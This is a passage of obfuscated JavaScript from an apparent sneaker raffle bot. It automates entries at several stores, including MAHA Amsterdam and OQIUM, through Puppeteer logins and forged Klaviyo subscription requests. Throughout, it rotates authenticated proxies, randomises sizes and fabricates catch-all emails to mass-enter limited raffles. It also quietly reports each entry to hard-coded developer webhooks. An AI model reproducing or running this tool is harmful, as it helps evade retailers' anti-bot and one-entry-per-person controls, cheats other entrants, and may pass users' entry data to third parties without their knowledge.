                                    'name': 'Delay',
                                    'value': '' + _0x5a0dc7['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2071e6
                                }
                            ]
                        }], _0x40f888 = await _0x1653b0(_0x550947[_0x437662], _0x109009, 'dev', ![]), _0x38c018 = await _0x1653b0(_0x550947[_0x437662], _0x109009, 'pub', ![]);
                        const _0x18a6af = {
                            'succesDEVMSG': { 'embeds': [_0x40f888] },
                            'succesPUBMSG': { 'embeds': [_0x38c018] }
                        };
                        await _0x5e3796(_0x550947, _0x437662);
                        if (_0x550947[_0x437662]['Email'] == '' || _0x550947[_0x437662]['Password'] == '' || _0x550947[_0x437662]['FirstName'] == '' || _0x550947[_0x437662]['LastName'] == '') {
                            console['log'](_0x13cc99() + '\x20[' + _0x109009['name'] + ']\x20Task\x20' + (_0x437662 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5a0dc7['useRandomProxy'] = ![])
                            var _0x5a3d66 = _0x4a6b73[_0x437662]['split'](':');
                        else
                            var _0x8b9eaa = Math['round'](Math['random']() * (_0x4a6b73['length'] - 0x1)), _0x5a3d66 = _0x4a6b73[_0x8b9eaa]['split'](':');
                        const _0x8fde7e = await _0x512dd9['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x5a3d66[0x0] + ':' + _0x5a3d66[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x3e72d4 = await _0x8fde7e['newPage']();
                            await _0x3e72d4['authenticate']({
                                'username': '' + _0x5a3d66[0x2],
                                'password': '' + _0x5a3d66[0x3]
                            }), console['log'](_0x13cc99() + '\x20[' + _0x109009['name'] + ']\x20Task\x20' + (_0x437662 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3e72d4['setRequestInterception'](!![]), _0x3e72d4['on']('request', _0x5ba813 => {
                                _0x5ba813['resourceType']() === 'image' || _0x5ba813['resourceType']() === 'font' || _0x5ba813['resourceType']() === 'media' ? _0x5ba813['abort']() : _0x5ba813['continue']();
                            }), await _0x3e72d4['goto']('' + _0x550947[_0x437662]['Url'], { 'waitUntil': 'networkidle2' }), await _0x207ff4(0x12c);
                            try {
                                await _0x3e72d4['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x3e72d4['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x13cc99() + '\x20[' + _0x109009['name'] + ']\x20Task\x20' + (_0x437662 + 0x1) + '\x20:\x20Logging\x20in'), await _0x3e72d4['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x3e72d4['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x3e72d4['waitForSelector']('#username'), await _0x3e72d4['type']('#username', _0x550947[_0x437662]['Email']), await _0x3e72d4['waitForSelector']('#password'), await _0x3e72d4['type']('#password', _0x550947[_0x437662]['Password']), await _0x207ff4(0x190), await _0x3e72d4['click']('#buttonSubmit'), await _0x3e72d4['waitForSelector']('div.b-user_greeting'), console['log'](_0x13cc99() + '\x20[' + _0x109009['name'] + ']\x20Task\x20' + (_0x437662 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x207ff4(0x1f4), await _0x3e72d4['goto']('' + _0x550947[_0x437662]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x13cc99() + '\x20[' + _0x109009['name'] + ']\x20Task\x20' + (_0x437662 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x550947[_0x437662]['Size']);
                            let _0x243b0b = _0x550947[_0x437662]['Size']['replace']('.5', '\x201/2');
                            await _0x3e72d4['click']('button[title=\x22' + _0x243b0b + '\x22]'), await _0x207ff4(0x1f4);
                            try {
                                await _0x3e72d4['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x207ff4(0x12c), console['log'](_0x13cc99() + '\x20[' + _0x109009['name'] + ']\x20Task\x20' + (_0x437662 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3e72d4['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x207ff4(0x12c), await _0x3e72d4['type']('#dwfrm_raffle_addressFields_firstName', _0x550947[_0x437662]['FirstName']), await _0x207ff4(0x12c), await _0x3e72d4['type']('#dwfrm_raffle_addressFields_lastName', _0x550947[_0x437662]['LastName']), await _0x207ff4(0x12c), await _0x3e72d4['select']('#dwfrm_raffle_addressFields_country', _0x550947[_0x437662]['Country']), await _0x207ff4(0x12c), await _0x3e72d4['type']('#dwfrm_raffle_addressFields_city', _0x550947[_0x437662]['City']), await _0x207ff4(0x12c);
                            _0x550947[_0x437662]['Postcode'] == undefined && (_0x550947[_0x437662]['Postcode'] = _0x550947[_0x437662]['Zip']);
                            await _0x3e72d4['type']('#dwfrm_raffle_addressFields_postalCode', _0x550947[_0x437662]['Postcode']), await _0x207ff4(0x12c), await _0x3e72d4['type']('#dwfrm_raffle_addressFields_address1', _0x550947[_0x437662]['Address1']), await _0x207ff4(0x12c), await _0x3e72d4['type']('#dwfrm_raffle_addressFields_address2', _0x550947[_0x437662]['HouseNumber']), await _0x207ff4(0x12c), await _0x3e72d4['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x550947[_0x437662]['Address2']), await _0x207ff4(0x12c), await _0x3e72d4['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x207ff4(0x12c), await _0x3e72d4['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x550947[_0x437662]['Follower']), await _0x207ff4(0x1f4), await _0x3e72d4['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x207ff4(0x1f4), console['log'](_0x13cc99() + '\x20[' + _0x109009['name'] + ']\x20Task\x20' + (_0x437662 + 0x1) + '\x20:\x20' + _0x191fc2['blue']('Awaiting\x20Paypal\x20Payment')), await _0x3e72d4['click']('.b-paypal_button');
                            try {
                                await _0x3e72d4['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x5e6574 = 'no', _0x40845b(_0x550947[_0x437662], _0x109009), console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x109009['name'] + ']\x20Task\x20' + (_0x437662 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x18a6af['succesDEVMSG']), await _0x207ff4(0xc8), await _0xf7d9ce(_0x565446, _0x18a6af['succesDEVMSG']), await _0x207ff4(0xc8), await _0xf7d9ce(_0xcaa949, _0x18a6af['succesPUBMSG']);
                            } catch (_0x1e6e65) {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x109009['name'] + ']\x20Task\x20' + (_0x437662 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x1e6e65)), _0x2cf2f8 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x1e6e65;
                                var _0x14f27e = await _0x1653b0(_0x550947[_0x437662], _0x109009, 'dev', !![], _0x2cf2f8);
                                _0x18a6af['errorDEV'] = { 'embeds': [_0x14f27e] }, _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x18a6af['errorDEV']), await _0xf7d9ce(_0x227865, _0x18a6af['errorDEV']);
                            }
                        } catch (_0x242b5d) {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x109009['name'] + ']\x20Task\x20' + (_0x437662 + 0x1) + '\x20:\x20' + _0x242b5d)), _0x2cf2f8 = '' + _0x242b5d;
                            var _0x14f27e = await _0x1653b0(_0x550947[_0x437662], _0x109009, 'dev', !![], _0x2cf2f8);
                            _0x18a6af['errorDEV'] = { 'embeds': [_0x14f27e] }, _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x18a6af['errorDEV']), await _0xf7d9ce(_0x227865, _0x18a6af['errorDEV']), _0x5e6574 = 'yes';
                        } finally {
                            _0x8fde7e && _0x8fde7e['close']();
                            if (_0x5e6574 == 'yes' && _0x2fb7ba != 0x5) {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x109009['name'] + ']\x20Task\x20' + (_0x437662 + 0x1) + '\x20:\x20Retrying')), _0x437662 = _0x437662 - 0x1, _0x2fb7ba = _0x2fb7ba + 0x1;
                                continue;
                            }
                            _0x5e6574 == 'yes' && _0x2fb7ba >= 0x5 && (_0x3fbd0e(_0x550947[_0x437662], _0x109009), _0x5e6574 = 'no', _0x2fb7ba = 0x0), console['log']('Waiting\x20for\x20' + _0x5a0dc7['AfewDelay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x3906f2, _0x1c7689, _0x425796) {
                    for (var _0x630294 = 0x0; _0x630294 < _0x1c7689['length']; _0x630294++) {
                        async function _0x557e98(_0x109c71, _0x51ec4a, _0x49c746, _0x59e05b, _0x3b42ae) {
                            var _0x54778b, _0x2b21f1 = {}, _0x159d3c = [], _0x19a742 = {}, _0x47ef2b = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x2a4010 = Math['round'](Math['random']() * (_0x47ef2b['length'] - 0x1));
                            _0x59e05b[_0x109c71]['Size'] == 'RANDOM' && (_0x59e05b[_0x109c71]['Size'] = _0x47ef2b[_0x2a4010]);
                            !_0x59e05b && (_0x59e05b = {});
                            if (_0x51ec4a != 'ver') {
                                _0x2164fd(_0x49c746['name'] + '\x20Task\x20' + (_0x109c71 + 0x1) + '\x20/\x20' + _0x59e05b['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517), await _0x5e3796(_0x59e05b, _0x109c71), _0x2b21f1 = _0x49c746['data'];
                                _0x51ec4a == 'exp' ? _0x2b21f1['data']['attributes']['email'] = '' + _0x59e05b[_0x109c71]['FirstName'] + _0x59e05b[_0x109c71]['LastName'] + _0x5a0dc7['catchall'] : _0x2b21f1['data']['attributes']['email'] = '' + _0x59e05b[_0x109c71]['Email'];
                                if (_0x59e05b[_0x109c71]['Size'] == 'RANDOM') {
                                }
                                _0x2b21f1['data']['attributes']['properties']['$first_name'] = '' + _0x59e05b[_0x109c71]['FirstName'], _0x2b21f1['data']['attributes']['properties']['$last_name'] = '' + _0x59e05b[_0x109c71]['LastName'], _0x2b21f1['data']['attributes']['properties']['$address1'] = _0x59e05b[_0x109c71]['Address1'] + '\x20' + _0x59e05b[_0x109c71]['Address2'] + '\x20' + _0x59e05b[_0x109c71]['HouseNumber'], _0x2b21f1['data']['attributes']['properties']['$zip'] = '' + _0x59e05b[_0x109c71]['Zip'], _0x2b21f1['data']['attributes']['properties']['$city'] = '' + _0x59e05b[_0x109c71]['City'], _0x2b21f1['data']['attributes']['properties']['$country'] = '' + _0x59e05b[_0x109c71]['Country'], _0x2b21f1['data']['attributes']['properties']['Size'] = '' + _0x59e05b[_0x109c71]['Size'], _0x2b21f1['data']['attributes']['properties']['$phone_number'] = '' + _0x59e05b[_0x109c71]['Phone'], _0x2b21f1['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x59e05b[_0x109c71]['Follower'];
                            }
                            if (_0x5a0dc7['useRandomProxy'] = ![])
                                var _0xcdad1d = _0x3b42ae[_0x109c71]['split'](':');
                            else
                                var _0x5b80a0 = Math['round'](Math['random']() * (_0x3b42ae['length'] - 0x1)), _0xcdad1d = _0x3b42ae[_0x5b80a0]['split'](':');
                            var _0x492907 = {
                                'jar': _0xf73368,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x49c746['url'],
                                'headers': _0x49c746['headers'],
                                'body': JSON['stringify'](_0x2b21f1),
                                'proxy': 'http://' + _0xcdad1d[0x2] + ':' + _0xcdad1d[0x3] + '@' + _0xcdad1d[0x0] + ':' + _0xcdad1d[0x1]
                            };
                            return _0x51ec4a != 'ver' && (_0x492907['url'] = _0x49c746['url'], _0x492907['headers'] = _0x49c746['headers']), _0x51ec4a == 'ver' && (_0x492907['method'] = 'GET'), new Promise(function (_0x11b1f4, _0x40d2be) {
                                callback = async (_0x3f4459, _0x24af11, _0x5723fd) => {
                                    if (!_0x3f4459 && _0x24af11['statusCode'] == 0xca || !_0x3f4459 && _0x24af11['statusCode'] == 0xc8) {
                                        if (_0x51ec4a != 'ver') {
                                            var _0x442e2f = await _0x1653b0(_0x59e05b[_0x109c71], _0x49c746, 'dev', ![]), _0x1665da = await _0x1653b0(_0x59e05b[_0x109c71], _0x49c746, 'pub', ![]);
                                            const _0xf94546 = {
                                                'succesDEVMSG': { 'embeds': [_0x442e2f] },
                                                'succesPUBMSG': { 'embeds': [_0x1665da] }
                                            };
                                            if (_0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '')
                                                try {
                                                    await _0xf7d9ce(_0x5a0dc7['webhook'], _0xf94546['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x207ff4(0xc8), await _0xf7d9ce(_0x565446, _0xf94546['succesDEVMSG']), await _0x207ff4(0xc8);
                                            try {
                                                await _0xf7d9ce(_0xcaa949, _0xf94546['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x40845b(_0x59e05b[_0x109c71], _0x49c746);
                                        }
                                        _0x11b1f4(console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x49c746['name'] + ']\x20Task\x20' + (_0x109c71 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x51ec4a != 'ver') {
                                            var _0x5860fe = '' + _0x3f4459, _0x56f2a8 = await _0x1653b0(_0x59e05b[_0x109c71], _0x49c746, 'dev', !![], _0x5860fe), _0x29db26 = {};
                                            _0x29db26['errorDEV'] = { 'embeds': [_0x56f2a8] }, _0x3fbd0e(_0x59e05b[_0x109c71], _0x49c746), _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x29db26['errorDEV']), await _0xf7d9ce(_0x227865, _0x29db26['errorDEV']);
                                        }
                                        _0x40d2be(console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x49c746['name'] + ']\x20Task\x20' + (_0x109c71 + 0x1) + ':\x20' + _0x3f4459)));
                                    }
                                };
                                try {
                                    _0x51ec4a != 'ver' && console['log'](_0x13cc99() + '\x20[' + _0x49c746['name'] + ']\x20Task\x20' + (_0x109c71 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2b21f1['data']['attributes']['email']), _0x331b3f(_0x492907, callback);
                                } catch (_0x332c57) {
                                    console['log'](_0x13cc99() + '\x20Task\x20' + (_0x109c71 + 0x1) + ':\x20' + _0x332c57);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x557e98(_0x630294, 'nor', _0x3906f2, _0x1c7689, _0x425796), console['log'](_0x13cc99() + '\x20[' + _0x3906f2['name'] + ']\x20Sleeping\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
                        } catch (_0x24b033) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x121dd0, _0x39f376, _0x44a0fa) {
                    for (var _0x1c90ce = 0x0; _0x1c90ce < _0x39f376['length']; _0x1c90ce++) {
                        async function _0x1ca50d(_0x364ae6, _0x304fc8, _0x25d6cc, _0x237c17, _0x50766f) {
                            var _0x1f4697, _0x1097bc = {}, _0x581e69 = [], _0x572fe4 = {}, _0x16e3ab = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x180345 = Math['round'](Math['random']() * (_0x16e3ab['length'] - 0x1));
                            _0x237c17[_0x364ae6]['Size'] == 'RANDOM' && (_0x237c17[_0x364ae6]['Size'] = _0x16e3ab[_0x180345]);
                            !_0x237c17 && (_0x237c17 = {});
                            if (_0x304fc8 != 'ver') {
                                _0x2164fd(_0x25d6cc['name'] + '\x20Task\x20' + (_0x364ae6 + 0x1) + '\x20/\x20' + _0x237c17['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517), await _0x5e3796(_0x237c17, _0x364ae6), _0x581e69 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x1d42cd
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x237c17[_0x364ae6]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x5a0dc7['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x2071e6
                                        }
                                    ]
                                }], _0x572fe4 = { 'embeds': _0x581e69 }, _0x1097bc = _0x25d6cc['data'];
                                _0x304fc8 == 'exp' ? _0x1097bc['data']['attributes']['email'] = '' + _0x237c17[_0x364ae6]['FirstName'] + _0x237c17[_0x364ae6]['LastName'] + _0x5a0dc7['catchall'] : _0x1097bc['data']['attributes']['email'] = '' + _0x237c17[_0x364ae6]['Email'];
                                if (_0x237c17[_0x364ae6]['Size'] == 'RANDOM') {
                                }
                                _0x1097bc['data']['attributes']['properties']['$first_name'] = '' + _0x237c17[_0x364ae6]['FirstName'], _0x1097bc['data']['attributes']['properties']['$last_name'] = '' + _0x237c17[_0x364ae6]['LastName'], _0x1097bc['data']['attributes']['properties']['$address1'] = _0x237c17[_0x364ae6]['Address1'] + '\x20' + _0x237c17[_0x364ae6]['Address2'] + '\x20' + _0x237c17[_0x364ae6]['HouseNumber'], _0x1097bc['data']['attributes']['properties']['$zip'] = '' + _0x237c17[_0x364ae6]['Zip'], _0x1097bc['data']['attributes']['properties']['$city'] = '' + _0x237c17[_0x364ae6]['City'], _0x1097bc['data']['attributes']['properties']['$country'] = '' + _0x237c17[_0x364ae6]['Country'], _0x1097bc['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x237c17[_0x364ae6]['Size'], _0x1097bc['data']['attributes']['properties']['$phone_number'] = '' + _0x237c17[_0x364ae6]['Phone'], _0x1097bc['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x237c17[_0x364ae6]['Follower'];
                            }
                            if (_0x5a0dc7['useRandomProxy'] = ![])
                                var _0x1af236 = _0x50766f[_0x364ae6]['split'](':');
                            else
                                var _0x1cfbd8 = Math['round'](Math['random']() * (_0x50766f['length'] - 0x1)), _0x1af236 = _0x50766f[_0x1cfbd8]['split'](':');
                            var _0x138f44 = {
                                'jar': _0xf73368,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x25d6cc['url'],
                                'headers': _0x25d6cc['headers'],
                                'body': JSON['stringify'](_0x1097bc),
                                'proxy': 'http://' + _0x1af236[0x2] + ':' + _0x1af236[0x3] + '@' + _0x1af236[0x0] + ':' + _0x1af236[0x1]
                            };
                            return _0x304fc8 != 'ver' && (_0x138f44['url'] = _0x25d6cc['url'], _0x138f44['headers'] = _0x25d6cc['headers']), _0x304fc8 == 'ver' && (_0x138f44['method'] = 'GET', _0x138f44['url'] = _0x237c17[_0x364ae6]), new Promise(function (_0x3254e0, _0x49772a) {
                                callback = async (_0x4f2c28, _0x2ba694, _0x1252d3) => {
                                    if (!_0x4f2c28 && _0x2ba694['statusCode'] == 0xca || !_0x4f2c28 && _0x2ba694['statusCode'] == 0xc8) {
                                        if (_0x304fc8 != 'ver') {
                                            var _0x1e1ba8 = await _0x1653b0(_0x237c17[_0x364ae6], _0x25d6cc, 'dev', ![]), _0x31bc75 = await _0x1653b0(_0x237c17[_0x364ae6], _0x25d6cc, 'pub', ![]);
                                            const _0x6cd0d4 = {
                                                'succesDEVMSG': { 'embeds': [_0x1e1ba8] },
                                                'succesPUBMSG': { 'embeds': [_0x31bc75] }
                                            };
                                            if (_0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '')
                                                try {
                                                    await _0xf7d9ce(_0x5a0dc7['webhook'], _0x6cd0d4['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x207ff4(0xc8), await _0xf7d9ce(_0x565446, _0x6cd0d4['succesDEVMSG']), await _0x207ff4(0xc8);
                                            try {
                                                await _0xf7d9ce(_0xcaa949, _0x6cd0d4['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x40845b(_0x237c17[_0x364ae6], _0x25d6cc);
                                        }
                                        _0x3254e0(console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x25d6cc['name'] + ']\x20Task\x20' + (_0x364ae6 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x304fc8 != 'ver') {
                                            var _0x561707 = '' + _0x4f2c28, _0x1f817a = await _0x1653b0(_0x237c17[_0x364ae6], _0x25d6cc, 'dev', !![], _0x561707), _0x4776b0 = {};
                                            _0x4776b0['errorDEV'] = { 'embeds': [_0x1f817a] }, _0x3fbd0e(_0x237c17[_0x364ae6], _0x25d6cc), _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x4776b0['errorDEV']), await _0xf7d9ce(_0x227865, _0x4776b0['errorDEV']);
                                        }
                                        _0x49772a(console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x25d6cc['name'] + ']\x20Task\x20' + (_0x364ae6 + 0x1) + ':\x20' + _0x4f2c28)));
                                    }
                                };
                                try {
                                    _0x304fc8 != 'ver' ? console['log'](_0x13cc99() + '\x20[' + _0x25d6cc['name'] + ']\x20Task\x20' + (_0x364ae6 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1097bc['data']['attributes']['email']) : console['log'](_0x13cc99() + '\x20[' + _0x25d6cc['name'] + ']\x20Task\x20' + (_0x364ae6 + 0x1) + ':\x20Fetching\x20Response'), _0x331b3f(_0x138f44, callback);
                                } catch (_0x25390c) {
                                    console['log'](_0x13cc99() + '\x20Task\x20' + (_0x364ae6 + 0x1) + ':\x20' + _0x25390c);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x1ca50d(_0x1c90ce, 'ver', _0x121dd0, _0x39f376, _0x44a0fa), console['log'](_0x13cc99() + '\x20[' + _0x121dd0['name'] + ']\x20Sleeping\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
                        } catch (_0x51f737) {
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RsxJgQ',
                            'custom_source': 'DV6989-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TiDS2V',
                                '$consent_form_version': 0x80926b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x3f0931, _0x1ba8ba, _0x56ec) {
                    for (var _0x4f9692 = 0x0; _0x4f9692 < _0x1ba8ba['length']; _0x4f9692++) {
                        async function _0x33edc9(_0x3bb573, _0x236bdd, _0x35e78d, _0x3318c6, _0x3ea0b6) {
                            var _0x71417b, _0x43d24b = {}, _0x468907 = [], _0x201e2d = {}, _0x58186e = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x1ff841 = Math['round'](Math['random']() * (_0x58186e['length'] - 0x1));
                            _0x3318c6[_0x3bb573]['Size'] == 'RANDOM' && (_0x3318c6[_0x3bb573]['Size'] = _0x58186e[_0x1ff841]);
                            !_0x3318c6 && (_0x3318c6 = {});
                            if (_0x236bdd != 'ver') {
                                _0x2164fd(_0x35e78d['name'] + '\x20Task\x20' + (_0x3bb573 + 0x1) + '\x20/\x20' + _0x3318c6['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517), await _0x5e3796(_0x3318c6, _0x3bb573), _0x468907 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x1d42cd
                                        },
                                        {
                                            'name': 'Size',
